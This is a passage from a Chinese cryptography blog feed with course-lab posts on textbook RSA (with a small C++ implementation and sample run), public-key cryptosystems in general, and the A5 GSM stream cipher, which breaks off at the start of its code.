class="string">&quot;15&quot;</span>,</span><br><span class="line"><span class="string">&quot;16&quot;</span>, <span class="string">&quot;17&quot;</span>, <span class="string">&quot;18&quot;</span>, <span class="string">&quot;19&quot;</span>, <span class="string">&quot;20&quot;</span>,</span><br><span class="line"><span class="string">&quot;21&quot;</span>, <span class="string">&quot;22&quot;</span>, <span class="string">&quot;23&quot;</span>, <span class="string">&quot;24&quot;</span>, <span class="string">&quot;25&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">string clear_text; <span class="comment">//明文</span></span><br><span class="line">string secret_text; <span class="comment">//密文</span></span><br><span class="line"></span><br><span class="line">LL p, q;<span class="comment">//两个安全大素数</span></span><br><span class="line">LL e, n;<span class="comment">//公钥</span></span><br><span class="line">LL private_key; <span class="comment">//私钥</span></span><br><span class="line">LL Euler;<span class="comment">// 欧拉函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> group; <span class="comment">// 分组长度（这里取的是小于10的因子主要是能被整除，比较方便）</span></span><br><span class="line"><span class="type">int</span> res; <span class="comment">//选择加密还是解密</span></span><br><span class="line"></span><br><span class="line">vector&lt;string&gt; encode_Int;<span class="comment">//加密时明文数字化</span></span><br><span class="line">vector&lt;string&gt; encrypt_Int; <span class="comment">// 解密时密文数字化</span></span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">qmi</span><span class="params">(LL a, LL k, LL p)</span> <span class="comment">//快速幂求余数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(k &amp; <span class="number">1</span>) res = (LL)res * a % p;</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_group</span><span class="params">(string s)</span> <span class="comment">// 获取分组的大小</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">1</span>;</span><br><span class="line">    group = cnt;</span><br><span class="line">    <span class="keyword">while</span>(len % cnt == <span class="number">0</span> &amp;&amp; cnt &lt; <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        group = cnt;</span><br><span class="line">        cnt ++ ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">exgcd</span><span class="params">(LL a, LL b, LL &amp;x, LL &amp;y)</span> <span class="comment">// 欧几里得扩展算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!b)</span><br><span class="line">    &#123;</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LL d, x1, y1;</span><br><span class="line">    d = <span class="built_in">exgcd</span>(b, a % b, x1, y1);</span><br><span class="line">    x = y1, y = x1 - a / b * y1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string s)</span> <span class="comment">// 加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">init_group</span>(s);</span><br><span class="line">    LL k, d;</span><br><span class="line">    n = p * q;</span><br><span class="line">    Euler = (p - <span class="number">1</span>) * (q - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exgcd</span>(e, Euler, d, k); <span class="comment">// 利用欧几里得扩展算法获取私钥d</span></span><br><span class="line">    private_key = d;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;公钥为：(&quot;</span> &lt;&lt; e &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl &lt;&lt;</span><br><span class="line">    <span class="string">&quot;私钥为：(&quot;</span> &lt;&lt; private_key &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i += group )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        string cnt = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(t &lt; group)</span><br><span class="line">        &#123;</span><br><span class="line">            cnt += alphabet[s[i + t] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            t ++ ;</span><br><span class="line">        &#125;</span><br><span class="line">        encrypt_Int.<span class="built_in">push_back</span>(cnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> t : encrypt_Int) <span class="comment">// 求加密后的c</span></span><br><span class="line">    &#123;</span><br><span class="line">        LL num, sum; <span class="comment">// 用于求加密后的cn</span></span><br><span class="line">        string c; <span class="comment">// 记录c1-cn</span></span><br><span class="line">        <span class="function">std::istringstream <span class="title">ss</span><span class="params">(t)</span></span>;</span><br><span class="line">        ss &gt;&gt; num;</span><br><span class="line">        sum = <span class="built_in">qmi</span>(num, e, n);</span><br><span class="line">        c = <span class="built_in">to_string</span>(sum);</span><br><span class="line">        <span class="keyword">while</span>(c.<span class="built_in">size</span>() &lt; group*<span class="number">2</span>) c.<span class="built_in">insert</span>(<span class="number">0</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        secret_text += c;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加密后的密文为：&quot;</span> &lt;&lt; secret_text &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(string s)</span> <span class="comment">//解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">init_group</span>(s);</span><br><span class="line">    n = p * q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i += group * <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        string tmp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> num, sum;</span><br><span class="line">        string m;<span class="comment">// 记录明文</span></span><br><span class="line">        <span class="keyword">while</span>(t &lt; group * <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp += s[i + t];</span><br><span class="line">            t ++ ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">std::istringstream <span class="title">ss</span><span class="params">(tmp)</span></span>;</span><br><span class="line">        ss &gt;&gt; num;</span><br><span class="line">        sum = <span class="built_in">qmi</span>(num, private_key, n);</span><br><span class="line">        m = <span class="built_in">to_string</span>(sum);</span><br><span class="line">        <span class="keyword">while</span>(m.<span class="built_in">size</span>() &lt; group*<span class="number">2</span>) m.<span class="built_in">insert</span>(<span class="number">0</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; group*<span class="number">2</span>; j += <span class="number">2</span> ) <span class="comment">// 将每一组的数字，每两位存在encrypt_Int里面</span></span><br><span class="line">        &#123;</span><br><span class="line">            string cnt = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(t &lt; <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cnt += m[j + t];</span><br><span class="line">                t ++ ;</span><br><span class="line">            &#125;</span><br><span class="line">            encrypt_Int.<span class="built_in">push_back</span>(cnt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> t : encrypt_Int) <span class="comment">// 求解密后的m</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="function">std::istringstream <span class="title">ss</span><span class="params">(t)</span></span>;</span><br><span class="line">        ss &gt;&gt; num;</span><br><span class="line">        clear_text += (<span class="string">&#x27;a&#x27;</span> + num);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;解密后的明文：&quot;</span> &lt;&lt; clear_text &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请给出两个大素数p，q和公钥e&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; p &gt;&gt; q &gt;&gt; e;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入1选择加密，或者输入2选择解密&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; clear_text;</span><br><span class="line">        <span class="built_in">encrypt</span>(clear_text);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入密文和私钥&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; secret_text &gt;&gt; private_key;</span><br><span class="line">        <span class="built_in">encode</span>(secret_text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加密</span></span><br><span class="line">请给出两个大素数p，q，和公钥e</span><br><span class="line">请输入<span class="number">1</span>选择加密，或者输入<span class="number">2</span>选择解密</span><br><span class="line">请输入明文</span><br><span class="line">公钥为：(<span class="number">13</span>,<span class="number">2537</span>)</span><br><span class="line">私钥为：(<span class="number">937</span>)</span><br><span class="line">加密后的密文为：<span class="number">1692080310931943229912540724</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line">请给出两个大素数p，q和公钥e</span><br><span class="line"><span class="number">43</span> <span class="number">59</span> <span class="number">13</span></span><br><span class="line">请输入<span class="number">1</span>选择加密，或者输入<span class="number">2</span>选择解密</span><br><span class="line"><span class="number">2</span></span><br><span class="line">请输入密文和私钥</span><br><span class="line"><span class="number">1692080310931943229912540724</span> <span class="number">937</span></span><br><span class="line">解密后的明文：cybergreatwall</span><br></pre></td></tr></table></figure><h2 id="3-RSA-安全性">3.RSA 安全性</h2><p>RSA 在安全性方面，容易遭到因子分解发，针对参数选择中的共模攻击，低指数攻击等等等</p><p>因此需要我们加强保护意思，在防范措施上主要体现在下面两点</p><ol><li><p>密钥长度</p><p>首先,在 RSA 密钥长度方面,应以达到使得攻击者在现有计算能力条件下不可破解为基本原则，同时，选择时需要考虑被保护的数据类型、数据保护期限、威胁类型以及最可能的攻击第方面。目前大多数标准要求使用 1024 比特 RSA 密不再使用 512 比特密钥。数域筛方法是比较有效的因子分解方法，并常用于确定 RSA 密钥长度的下限。在 2000 年,Silverman 依此推断 1024 比特密钥在未来 20 年内还是安全的。但是,NIST(The NationalInstitute ofStandard and Technology)的《Key Managemen Guideline》草案中只推荐使用 RSA1024 比特长密钥来加密保存要求不超过 2015 年保密要求期限的数据,如果保密期限超过 2015 年,则建议至少使用 2048 比特长密钥。另外,也要考虑密钥长度对密钥生成、加密和解密运算效率的<br>影响</p></li><li><p>参数选择</p><p>除了需要选取足够大的大整数 n 外,对素数 p 和 q 的选取应该满足以下要求</p><ol><li>为避免椭圆曲线因子分解法,p 和 g 的长度相差不能太大。如使用 1024 比特的模数 n,则 p 和 g 的模长都大致在 512 比特左右。</li><li>p 和 q 差值不应该太小。</li><li>gcd(p-1,q-1)应该尽可能小。</li><li>p 和 q 应为强素数,即 p-1 和 q-1 都应有大的素因子。</li><li>为了防止低指数攻击,加密指数 e 和解密指数 d 都不能选取太小的数</li></ol></li></ol><h2 id="4-总结">4.总结</h2><p>关于 RSA 的优点缺点</p><p>优点：</p><ol><li>安全性高：RSA 算法基于数学难题，使得即使在今天的高性能计算机环境中，也很难进行有效的破解。因此，RSA 在保证信息安全性方面表现出色。</li><li>适用范围广：RSA 算法适用于多种应用场景，如互联网、电子邮件、数据存储等。它可以用于数据加密、数字签名、身份验证等任务。</li><li>灵活性好：RSA 算法支持多种密钥长度，可以根据实际需求选择不同的密钥长度来平衡安全性和性能。此外，RSA 还支持多种填充方案和摘要算法，具有较强的灵活性。</li></ol><p>缺点：</p><ol><li>加密和解密速度慢：相比于对称加密算法，如 AES，RSA 算法的加密和解密速度较慢。这是因为 RSA 算法需要进行大量的数学运算，尤其是在处理大块数据时。</li><li>密钥管理困难：由于 RSA 算法使用的是非对称密钥，因此需要管理两个密钥（公钥和私钥）。如果密钥丢失或被盗，可能会对信息安全造成威胁。此外，在分布式系统中，如何安全地分发和管理密钥也是一个难题。</li><li>实现成本高：RSA 算法需要使用大量的数学运算和内存资源，因此在一些资源受限的环境中，实现 RSA 算法可能会比较困难。此外，RSA 算法也需要较高的计算能力，因此在一些老旧或性能较低的设备上，可能会影响其性能表现。</li></ol>]]></content>
    
    
    <summary type="html">RSA密钥生成算法及加解密算法的原理及C++代码</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="RSA算法" scheme="https://nonevector.top/tags/RSA%E7%AE%97%E6%B3%95/"/>
    
    <category term="欧拉函数" scheme="https://nonevector.top/tags/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/"/>
    
    <category term="欧拉定理" scheme="https://nonevector.top/tags/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86/"/>
    
    <category term="逆元" scheme="https://nonevector.top/tags/%E9%80%86%E5%85%83/"/>
    
  </entry>
  
  <entry>
    <title>公钥密码体制概述</title>
    <link href="https://nonevector.top/posts/8.html"/>
    <id>https://nonevector.top/posts/8.html</id>
    <published>2023-11-05T00:56:08.585Z</published>
    <updated>2023-11-29T03:35:43.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-公钥密码体制">1.公钥密码体制</h2><p>公钥密码体制为密码学的发展提供了新的理论和技术基础,它的出现是迄今为止整个密码学发展史上最伟大的一次革命,甚至可以说没有公钥密码体制,就没有现代密码学。</p><hr><h2 id="2-公钥密码体制的提出">2.公钥密码体制的提出</h2><p><strong>对称密码体制</strong>,即解密密钥与加密密钥相同或解密密钥可由加密密钥推算出来,可以在定程度上解决保密通信的问题。但随着计算机和网络的飞速发展，保密通信的需求越来越泛.对称密码体制的局限性就逐渐显现出来，主要表现在:</p><ol><li>密钥分发问题<br>使用对称密码体制进行保密通信时,通信双方要事先通过安全的信道传递密钥，而安全信道是不易实现的。所以发送方如何安全、高效地发送密钥到接收方(通常称为初始密钥分发)是对称密码体制难以解决的问题。</li><li>密钥管理问题<br>在<code>n</code>个用户的通信网络中,使用对称密码体制实现两两保密通信,则每个用户需要和其他<code>n-1</code>个用户分别共享一个钥,而系统中的总密钥量将达到<code> n(n-1)/2</code>。当<code>n</code>较大时，这样大的密钥量,使得密钥产生、保存、传递、使用和销毁等各个管理环节都会变得很复杂,存在全隐患。</li><li>数字签名问题<br>对称密码体制中通信双方拥有同样的密钥,所以任何一方都可以生成消息的认证标签，发送方可以否认发送过某消息,即无法实现信息安全的不可否认性目标，或者说不能实现数签名功能。</li></ol><p>正是对称密码体制存在的这些局限性以及实际应用需求促使一种新的密码体制被提出。1976 年,Whitefield Diffie 和 Martin Hellman 在论文《密码学的新方向》(New DirectionsiCryptography)中提出一个设想:</p><p>用户<code>A</code>有一对密:加密密钥 $P_k$和解密密钥$S_k$公开$P_k$，保密$S_k$。若<code>B</code>要给<code>A</code>发送加密信息,他需要在公开的目录中查出<code>A</code>的公开(加密)密钥$ P_k$，用它用加密消息;A 收到密文后,用自己秘密保存的解密密钥 $S_k$解密密文,由于别人不知道 $S_k$即截获了密文,也无法恢复明文。在这种思想中,加密密钥和解密密钥是不同的，加密密钥是公开的且从加密密钥推出解密密钥是不可行的。基于这种思想建立的密码体制，被称为<strong>公钥密码体制</strong>,也叫<strong>非对称密码体制</strong>。这个设想提出之后,立刻引起密码学家的高度重视和浓厚兴趣,多种公钥密码算法相继被提出,可惜许多是不安全的,而那些被视为安全的算法又有许多不实用。直到 1978 年,美国麻省理工学院的 Rivest、Shamir 和 Adleman 3 位密码学家提出了<code>RSA</code> 公钥密码体制，很好地解决了对称密码体制所面临的问题。</p><hr><h2 id="3-公钥加密体制的思想">3.公钥加密体制的思想</h2><p>公钥密码体制，通常要使用一些计算上困难的问题。更重要的是,与只使用单一密钥的传统加密技术不同,它在加密/解密时,分别使用了两个不同的密钥:一个可对外界公开,称为公钥或公开密钥,用于加密消息;另一个只有所有者知道,称为私钥或私有密钥,用于解密消息。公钥和私钥之间具有紧密关系，但由公开密钥推导私有密钥,在计算上是不可行的。</p><p>通常情况下,公钥加密体制满足以下要求。</p><ol><li>接收方 <code>A</code>容易产生一对密钥(公钥 $P_k$和私钥$ S_k$)。</li><li>发送方<code> B</code>在知道接收方 <code>A</code>公钥 $P_k$和待加密消息<code>M </code>的情况下很容易通过加密函数计算产生对应的密文 <code>C</code>;同理,接收方收到密文 <code>C</code>后,容易用私钥和解密函数解出明文。</li><li>敌对方<code>T</code>即使知道公钥 $P_k$,要确定私钥 $ S_k$在计算上是不可行的。</li><li>敌对方<code>T</code>即使知道公钥 $P_k$和密文 <code>C</code>,要想恢复原来的消息<code> M</code> 在计算上也是不可行的。</li><li>加密、解密次序可交换,即 $E_{P_k}[D_{S_k}(M)]=D_{S_k}[E_{P_k}(M)]$。（E=解密，D=加密）</li></ol><p>最后一条不是对所有的算法都作这个要求,但非常有用。<br>公钥加密体制与陷门单向函数有关,要满足上述对公钥加密体制的要求,最终可归结为设计一个陷门单向函数。</p><p>陷门单向函数是满足下列条件的函数 <code>f</code>:</p><ol><li>正向计算容易，即如果知道密钥 <code>P</code>和消息<code>M</code>,容易计算$C=f_{P_k}(M)$;</li><li>在不知道密钥$S_k$的情况下,反向计算不可行,即如果只知道加密后的消息 <code>C</code>而不知道密钥$S_k$,则计算 $M=f^{-1}©$不可行;</li><li>在知道密钥 $S_k$的情况下,反向计算容易,即如果同时知道加密消息 <code>C</code>和密钥$S_k$,则计算 $M=f^{-1}_{S_k}©$是容易的,这里的密钥 $S_k$相当于陷门,它和 $P_k$配对使用。</li></ol><p>对于以上的条件,若仅满足(1)、(2)的函数称为<strong>单向函数</strong>。</p><p>在现实世界中,这样的例子很普遍,如将挤出的牙膏弄回管子里要比把牙膏挤出来困难得多;把盘子打碎成数片碎片很容易，但要把所有这些碎片再拼成为一个完整的盘子则很难。数学上有很多函数感觉像单向函数,能够有效地计算它们,但至今未找到有效的求逆算法。如将许多大素数相乘要比将其乘积因式分解容易得多。</p><p>第(3)条称为<strong>陷门性</strong>,其中的密钥 $S_k$:称为陷门信息。也就是说,对于陷门单向函数而言，若不知道某种附加的信息，它是一个单向函数,有了附加信息,函数的反向就容易计算出来。在现实生活中,这样的例子也不少,比如将一个手表拆分为数百个细小的零件很简单,但是若要想将这些零件重新组合起来成为一个可工作的手表却很难,这就需要知道陷门(手表的结构图及装配指令)才能完成重新组合。</p><p>公钥加密体制中的公钥用于陷门单向函数的正向(加密)计算,私钥用于反向(解密)计算。</p><hr><h2 id="4-公钥密码体制的分类">4.公钥密码体制的分类</h2><p>自 1976 年公钥密码体制的思想提出以来,国际上已经出现了许多种公钥加密体制,例如基于大整数因子分解问题的公钥加密、基于有限域乘法群上的离散对数问题的公钥加密、基于椭圆曲线上的离散对数问题的公钥加密、基于背包问题的公钥加密、基于格的短向量问题的公钥加密、基于代数编码中的线性解码问题的公钥加密等。目前应用最广的公钥加密体制主要有 3 个;<code>RSA</code>公钥加密体制,<code>EIGamal</code>公钥加密体和<code>椭圆曲线公钥加密体制</code>。</p><blockquote><p>应老师实验要求，本博客还有介绍<a href="https://www.nonevector.top/posts/9.html">RSA 公钥加密体制</a>和<a href="https://www.nonevector.top/posts/10.html">MH 背包公钥加密体制</a>,如需查看，点击直达 🤗</p></blockquote>]]></content>
    
    
    <summary type="html">公钥密钥的介绍、加密思路、分类</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="公钥密码体制" scheme="https://nonevector.top/tags/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>典型序列密码算法之A5</title>
    <link href="https://nonevector.top/posts/7.html"/>
    <id>https://nonevector.top/posts/7.html</id>
    <published>2023-10-31T12:04:33.321Z</published>
    <updated>2023-11-29T03:35:49.151Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、A5-算法">一、A5 算法</h2><h2 id="背景">背景</h2><p><code>A5 </code>算法是 <code>GSM </code>系统中使用的加密算法之一,主要用于加密手机终端与基站之间传输的语音和数据。该算法由一个 <code>22</code> 比特长的参数(帧号码,<code>Fn</code>)和 <code>64</code> 比特长的参数(会话密钥<code>Kc</code>),生成两个<code>114</code>比特长的序列(密钥流)。这样设计的原因是<code>GSM</code>会话每含<code>228</code>比特通过与 A5 算法产生的<code> 228</code> 比特密钥流进行异或实现保密。<code>A5</code> 算法有<code> 3</code> 种版本 <code>A5/1</code> 算法限制出口,保密性较强;<code>A5/2 </code>算法没有出口限制,但保密性较弱;<code>A5/3 </code>算法则是更新的版本,它基于 <code>KASUMI</code> 算法,但尚未被<code>GSM</code>标准采用。</p><h3 id="流程-（详细）">流程 （详细）</h3><p><code>A5</code>算法是一种典型的基于线性反馈移位寄存器的序列密码算法,构成<code> A5</code> 加密器主体的<code>LFSR</code>有<code>3</code>个,组成了一个集互控和停走于一体的钟控模型。线性移位寄存器(<code>ABC</code>)的长度各不相同:<code>A</code>有<code>19</code>位,<code>B</code>有 <code>22</code>位,<code>C</code>有<code> 23</code>位,它们的移位方式都是由低位移向高位。每次移位后,最低位就要补充一位,<strong>补充的值由寄存器中的某些抽头位进行异或运算的结果决定</strong>,如运算的结果为<code>“1”</code>,则补充<code>“1”</code>,否则补充<code>“0”</code>。在 3 个 LFSR 中 A 的抽头位置为 <code>18,17,16,13</code>;<code>B</code>的抽头位置为<code> 21,20,16,12</code>;C 的抽头位置为 <code>22,21,18,17</code>。<code>3</code>个<code>LFSR</code>输出的异或值作为<code> A5</code>算法的输出。<code>A5</code>算法的主体部分如图 5-26 所示。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/10/31/169037_f5c36a9d77-1.png" alt="1.png"></p><p>这 <code>3</code>个<code> LFSR</code> 的移位是由时钟控制的,且遵循“服从多数”的原则。即从每个寄存器中取出一个中间位(图<code>5-26</code>中的<code>xyz</code>,位置,分别为 <code>ABC</code>的第<code> 9</code>,<code>11</code>,<code>11</code>位)进行运算判断,若在取出的<code>3</code>个中间位中至少有<code> 2</code>个为<code>“1”</code>,则为<code>“1”</code>的寄存器进行一次移位,而为<code>“0”</code>的不移反过来,若<code>3</code>个中间位中至少有 <code>2</code>个为<code>“0”</code>,则为<code>“0”</code>的寄存器进行一次移位，而为<code>“1”</code>的不移。</p><p>显然，这种机制保证了每次至少有 <code>2</code>个 <code>LFSR</code> 被驱动移位。一个<code>GSM</code>消息被转换成一系列的帧，每帧具有 <code>228</code>位。<code>A5</code>算法在会话密<code>Kc</code>和数<code>Fn</code> 的作用下输出相应的密钥序列,与<code>GSM</code>消息逐比特的异或,完成对消息的加密，如图 5-27 所示。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/10/31/169037_f89bc2f177-2.png" alt="2.png"></p><h3 id="流程（总结）">流程（总结）</h3><p><strong>1.原始密钥:</strong></p><p>A5 算法的输入为<strong>22bit</strong>长的<strong>帧序号</strong> $F_n$和<strong>64bit</strong>长的<strong>密钥</strong> $K_c$，<strong>输出为 228bit 的流密钥序列</strong>。</p><p><strong>2. A5 算法的构成：</strong></p><p>A5 算法由<strong>3 个 m 序列 LFSR 构成</strong>，这三个 LFSR 的<strong>级数分别为 19、22、23</strong>。其特征多项式分别为：</p><ul><li>LFSR1： $g_1(x) = x^{19} + x^{18} + x^{17} + x^{14} + 1$</li><li>LFSR2： $g_2(x) = x^{22} + x^{21} + x^{17} + x^{13} + 1$</li><li>LFSR3： $g_3(x) = x^{23} + x^{22} + x^{19} + x^{18} + 1$</li></ul><p><strong>3、流密钥序列的产生过程：</strong></p><p>A5 算法流密钥序列的产生包含<strong>初始化</strong>和<strong>不规则动作</strong>两个阶段。</p><p><strong>（1）初始化阶段：</strong></p><p>首先将 3 个 LFSR 的初始状态全设为 0。</p><p>然后在 64bit 密钥 $K_c$的作用下，3 个 LFSR 分别移位<strong>64 次</strong>。每次（假设第 i 次）移位时，反馈函数计算的结果需要先与$K_c$的第 i 位进行异或，然后才作为反馈结果填充到每个 LFSR 的最末端。</p><p>之后在 22bit 帧序号$F_n$ 的作用下，3 个 LFSR 分别移位<strong>22 次</strong>。每次（假设第 i 次）移位时，反馈函数计算的结果需要先与 $F_n$ 的第 i 位进行异或，然后才作为反馈结果填充到每个 LFSR 的最末端。</p><p>初始化阶段的目的是给三个 LFSR 提供随机性良好的非全零的初始状态，为后面产生流密钥做准备。</p><p><strong>（2）不规则动作阶段：</strong></p><p>接下来的阶段中，需要时钟脉冲来控制 3 个 LFSR 进行移位输出。</p><p>所谓不规则动作，就是指 3 个 LFSR 的移位是不规则的。A5 算法采取的方法是，分别从 LFSR1、LFSR2、LFSR3 中选取<strong>第 9 位</strong>、<strong>第 11 位</strong>、<strong>第 11 位</strong>作为<strong>检测位</strong>（分别<strong>记为 x，y，z</strong>），进行钟控移位。移位规则是：<strong>多数移位，少数不移位</strong>。假如 x、y、z 中至少有 2 个为“1”，则为“1”的 LFSR 移位一次，为“0”的不移位；假如 x、y、z 中至少有 2 个为“0”，则为“0”的 LFSR 移位一次，为“1”的不移位。这种机制保证了每次时钟脉冲到来时，至少有 2 个 LFSR 移位。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/31/169037_0feb609377-3.png" alt="3.png"></p><p>采取这种移位方法，A5 算法的不规则动作阶段的具体流程为：</p><p>加密</p><ul><li>1、在时钟脉冲的作用下，3 个 LFSR 采取上述移位方式，动作<strong>100 次</strong>，但不输出。</li><li>2、在时钟脉冲的作用下，3 个 LFSR 采取上述移位方式，动作<strong>114 次</strong>，产生输出。每次动作后，<strong>先对产生的 3 个输出进行异或，然后作为流密钥序列的一位</strong>。</li><li>3、在时钟脉冲的作用下，3 个 LFSR 采取上述移位方式，再次动作<strong>100 次</strong>，不输出。</li></ul><p>解密</p><ul><li><p>三个 LFSR 以钟控方式连续动作 100 次，但不输出密钥流；</p></li><li><p>三个 LFSR 以钟控方式连续动作 114 次，在每次动作后，三个 LFSR 都 将最高级寄存器中的值输出，这三个比特的模 2 和就是当前时刻输出的 1 比 特密钥流。</p></li><li><p>连续动作 114 步，共输出 114 比特密钥流，这 114 比特用于对基站到用户手机 传送的 114 比特数据的解密。</p></li></ul><p>如下图</p><p><img src="https://cdn.acwing.com/media/article/image/2023/10/31/169037_f5c36a9d77-1.png" alt="1.png"></p><p>4、加解密方式：</p><p>同其他流密码加密方式相同，A5 算法也是直接将明文与产生的流密钥序列进行按位异或，得到密文。密文与流密钥序列异或后，也可得到明文。</p><p>GSM 消息通常使用 A5 算法<strong>对每个会话分别加密</strong>，其每个会话的长度为 224bit，与 A5 算法流密钥序列长度相同，因此加密方式就是简单地异或。如下图所示，对于每帧会话，A5 算法的输入$F_n$是有变化的。</p><h2 id="C-代码">C++代码</h2><blockquote><p>下面代码介绍了生成比特密钥流的例子！！</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 